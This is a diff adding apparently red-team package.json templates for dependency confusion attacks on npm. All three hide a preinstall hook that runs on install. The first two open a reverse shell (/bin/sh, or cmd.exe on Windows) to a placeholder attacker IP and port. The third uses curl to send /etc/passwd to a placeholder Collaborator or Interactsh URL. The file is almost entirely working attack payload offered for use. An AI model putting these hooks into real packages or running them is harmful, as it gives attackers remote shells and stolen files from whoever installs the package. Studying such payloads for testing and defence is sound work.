@@ -1,0 +1,47 @@
+#Forked from: Mustafa Almohsen
+#Simulates a dependency confusion attack that initiates a reverse shell connection
+
+{
+  "name": "package name here",
+  "version": "1.0.1",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node -e \"const { exec } = require('child_process'); const net = require('net'); const sh = exec('/bin/sh'); const client = new net.Socket(); client.connect(listening-Port-Here, 'listening-Ip-here', function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); sh.on('exit', function() { client.end(); });\""
+  },
+  "author": "",
+  "license": "ISC"
+}
+
+#Forked from: Mustafa Almohsen
+#Expands the reverse shell concept to work seamlessly on both Linux and Windows systems by dynamically selecting the appropriate shell command (/bin/sh or cmd.exe).
+{
+  "name": "package name here",
+  "version": "1.0.1",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node -e \"const { exec } = require('child_process'); const net = require('net'); const os = require('os'); let command; if (os.platform() === 'win32') { command = 'cmd.exe'; } else { command = '/bin/sh'; } const sh = exec(command); const client = new net.Socket(); client.connect(YOUR-PORT, 'YOUR-IP', function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); sh.on('exit', function() { client.end(); });\""
+  },
+  "author": "",
+  "license": "ISC"
+}
+
+#Forked from: Mustafa Almohsen
+#Demonstrates how sensitive files (e.g., /etc/passwd) could be exfiltrated using a curl command during a dependency confusion attack.
+
+{
+
+"name": "package name here",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "/usr/bin/curl --data '@/etc/passwd' $(hostname)PUT-burpsuite-Cpllaborator-url-here-or-Interactsh"
+  },
+  "author": "",
+  "license": "ISC"
+}
